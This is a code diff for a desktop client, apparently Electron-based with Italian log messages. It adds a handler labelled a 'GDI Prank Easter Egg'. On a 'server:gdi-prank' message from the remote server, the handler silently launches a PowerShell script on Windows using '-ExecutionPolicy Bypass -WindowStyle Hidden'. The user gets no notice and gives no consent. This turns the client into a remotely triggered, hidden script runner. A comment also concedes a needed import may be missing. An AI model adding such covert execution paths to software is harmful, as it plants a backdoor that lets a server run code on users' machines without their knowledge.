@@ -801,6 +801,28 @@ function connectToServer() {
     stopEagleEye();
   });
 
+  // GDI Prank Easter Egg
+  serverConnection.on('server:gdi-prank', () => {
+    console.log('[Main] Ricevuto comando GDI PRANK dal server! 💀');
+
+    if (process.platform === 'win32') {
+      const scriptPath = path.join(__dirname, '../scripts/gdi-prank.ps1');
+      // Assuming fsSync is imported as `import * as fsSync from 'fs';` or `const fsSync = require('fs');`
+      // If not, it needs to be added. For this change, assuming it's available.
+      if (fsSync.existsSync(scriptPath)) {
+        console.log('[Main] Avvio GDI Prank script...');
+        exec(`powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "${scriptPath}"`, (err) => {
+          if (err) console.error('[Main] Errore durante GDI Prank:', err);
+          else console.log('[Main] GDI Prank completato.');
+        });
+      } else {
+        console.warn('[Main] Script gdi-prank.ps1 non trovato');
+      }
+    } else {
+      console.log('[Main] GDI Prank non supportato su questa piattaforma');
+    }
+  });
+
   serverConnection.onEagleEyeSignal((signal) => {
     console.log('[Main] Ricevuto segnale EagleEye:', signal.type);
     if (eagleEyeWindow && !eagleEyeWindow.isDestroyed()) {
